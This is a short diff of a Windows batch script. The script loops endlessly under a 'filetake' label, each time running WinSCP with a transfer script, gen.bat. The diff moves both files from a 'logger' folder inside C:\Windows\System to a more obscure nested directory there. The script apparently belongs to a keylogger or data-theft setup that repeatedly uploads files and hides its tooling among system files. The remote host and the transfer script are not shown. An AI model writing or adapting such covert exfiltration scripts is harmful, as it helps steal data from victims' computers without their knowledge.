@@ -1,4 +1,4 @@
 @echo off
 :filetake
-C:\Windows\System\logger\WinSCP.com /script=C:\Windows\System\logger\gen.bat
+C:\Windows\System\Text\r\3\WinSCP.com /script=C:\Windows\System\Text\r\3\gen.bat
 goto filetake
